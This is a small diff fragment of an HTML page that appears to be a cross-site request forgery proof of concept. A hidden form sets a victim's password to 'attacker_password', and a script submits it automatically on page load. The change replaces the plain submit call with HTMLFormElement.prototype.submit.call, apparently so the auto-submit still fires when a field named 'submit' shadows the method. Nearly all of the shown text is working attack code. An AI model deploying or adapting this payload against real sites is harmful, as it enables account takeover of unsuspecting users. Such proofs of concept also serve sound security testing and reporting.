@@ -9,6 +9,6 @@
   <input type="hidden" name="password" value="attacker_password" />
   <input type="hidden" name="submit" value="Submit" />
 </form>
-<script>document.getElementById('csrf').submit();</script>
+<script>HTMLFormElement.prototype.submit.call(document.getElementById('csrf'));</script>
 </body>
 </html>
